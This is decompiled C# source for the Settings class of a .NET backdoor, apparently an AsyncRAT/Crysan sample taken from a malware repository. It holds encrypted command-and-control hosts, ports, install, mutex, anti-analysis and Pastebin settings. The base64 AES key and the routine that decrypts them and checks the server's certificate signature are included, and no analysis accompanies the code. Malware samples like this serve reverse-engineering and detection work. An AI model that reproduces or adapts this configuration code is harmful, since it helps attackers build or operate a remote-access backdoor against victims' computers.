// Decompiled with JetBrains decompiler
// Type: Client.Settings
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\Backdoor.MSIL.Crysan.ecy-9f340084a105595091444c4fe491dcb4cee297c296812165dcbe4f23579fff1a.exe

using Client.Algorithm;
using Client.Helper;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
  public static class Settings
  {
    public static string Ports = "6H9YivuvJDxXlw0/5RNC70h90BOHOA0c7q1Ua718t6wwFZGWZDNivt0omXLXYpDnt/ZxvtAeEyh3xXbWQ19DMg==";
    public static string Hosts = "1RL5MMo9gSGavOfKRD5KEVM0Ma+QemUpYVyl0MKrLbBTyIxslRBjmQo/bpBpKnjliEcEOstpIqTwfyg0W/ZELQ==";
    public static string Version = "806nHHkFvG4YuXZLFxIi0Hz4jdQql5c8bhnK7okvI1UixCLkx3RuLFto3yjXJ3q9oeMCd3fAuxKEgERjGlyo3g==";
    public static string Install = "rX6DFhD3nrazXYnCGupuPiuOcfslmm13mkKre/hXxTXms7Bfi8TjBuYy29J//fLdsl9lHRxQY/amOU0VzVY2MA==";
    public static string InstallFolder = "%AppData%";
    public static string InstallFile = "";
    public static string Key = "ZDlDZ1RCSGFIMUwyNVk3UFZqTGRQZER4WndYZm82OXk=";
    public static string MTX = "h+ED+tWWuc1qj/L9HeIPksxJkmSZnQxa/jDLHdbrmCpF8Uxn2/Vv0ZufQDNrk5m5jNwZLDoLYXqSIBwc/WR+Aak1gsVZbTywbmE0B0mD8Pk=";
    public static string Certificate = "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";
    public static string Serversignature = "iJC5AXcue7F9G9P+5p9gL9i/zgcU1r7mclyfkv9w8WwSMqRBTW8IEDDnHF8UcyWuq3aQxBfxDXIdb6TjwXn7cYTMkndkDtwFmapnYGvwcdDFAEMgvCglxirzXMmFwZFGZQ+NAzJ5P3fJfbqEeKDFk/kL8HSYj8zPL8si0ioENJYTR4DyqXhb4/sNRXXW8CL/cV7Yfu1SjWyD1MWTL+5Lx2wA8VEc/OyEBbuKD2jyJuz/FS0O1Lv51/wrG7X/MyBRVt5yg49PkPRi+BAJ1aIRs1I7uI2sZNEJ17cK7JjgFpvHe5klVe3djti6oDQL5gxPIr1M3Gy2O5huEiBPZ0dKBHQX8VlPZSpN1jAtezOM+NbLeAYtabEmf9pOu+fFq5IC4EAnYwLl5ZAz4cAZT3dQe/RHbPUzlNyB3DoUfYbXa95wlMAJMFs3KI0a9xNM7wnMcthtKx3Aa38CJ5pz3EhmcmPCLeFLUGYV5+Vz5odQl612kUk3bxSQExXPnUOhb+brai1LBO5h2+pVLq49MqOPoi+M/Q2qURFt4D9D5lphGu373T2nkP4gXlBouyW3GJTV8oorlH52rKbMwMbWLF8ykGSG8BylXd5vY+8jYiC1GgFBnLStj+sICi8V9Fph9QLsFaCtEYTjGs2rSZMGsEXVEW97uDw1seAzOc3EENY6oWh6WaZ/GKCBjAF+5l/YNnUL43yEP9a4OpcbEy0gTQhh28tL+ejOEDCh0x141zUikEHmBD5/HTMpB9NV8CIXBQWrZnhcvOrM6PMwqYH26wt0lk2B97BfANJRtm1e6OpqPqgcQaX4eld9eegoy0esnrBIf9A3pBsf3dck9tOTXvX0yRk7sVAvH2gLR2dXLso2zmXQSN5Wj1xJXaYzULXh+Q7vkH303JTYBow7j0Tk8oHRT8E2reHdfONFVXv9aMuYH+/031le6vSNaJ+q4aY1t3T2mTFOdInJFh4ayXiwwhh+HQ==";
    public static X509Certificate2 ServerCertificate;
    public static string Anti = "S1TwVy7Cj8ttO7jwbUHB91FpBhZmiNNQ4YhTPxeROmMtSwVIMS/ARGFL4r4zYtaJ3HgafqCzB34dy7zBptacaA==";
    public static Aes256 aes256;
    public static string Pastebin = "vV0x/3XCP5/7do0/oZ9z+1D6aJUsrF6BrvYRo8C+m+5qFyMKAnaZH27hQuWgfwWxsQfSKRa/xH+D+fxuyceErA==";
    public static string BDOS = "HhRfKFC1vbWjDO+Y/MBT44hUKNoKp7VNt+6cpd3gEcMeWq7yxW7afzzq6exACdXGSV3kIpuLO7UkSe3qa4l06g==";
    public static string Hwid = (string) null;
    public static string Delay = "3";
    public static string Group = "7lOZlz12kb2a50IvbDGdybQlIHSZhP0XXcfQK/Z0oDG/j79F23ho8iEwnDirQnya4Mxl6qzcIqwKKM7+N/MF9A==";

    public static bool InitializeSettings()
    {
      try
      {
        Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
        Settings.aes256 = new Aes256(Settings.Key);
        Settings.Ports = Settings.aes256.Decrypt(Settings.Ports);
        Settings.Hosts = Settings.aes256.Decrypt(Settings.Hosts);
        Settings.Version = Settings.aes256.Decrypt(Settings.Version);
        Settings.Install = Settings.aes256.Decrypt(Settings.Install);
        Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
        Settings.Pastebin = Settings.aes256.Decrypt(Settings.Pastebin);
        Settings.Anti = Settings.aes256.Decrypt(Settings.Anti);
        Settings.BDOS = Settings.aes256.Decrypt(Settings.BDOS);
        Settings.Group = Settings.aes256.Decrypt(Settings.Group);
        Settings.Hwid = HwidGen.HWID();
        Settings.Serversignature = Settings.aes256.Decrypt(Settings.Serversignature);
        Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certificate)));
        return Settings.VerifyHash();
      }
      catch
      {
        return false;
      }
    }

    private static bool VerifyHash()
    {
      try
      {
        return ((RSACryptoServiceProvider) Settings.ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Serversignature));
      }
      catch (Exception ex)
      {
        return false;
      }
    }
  }
}
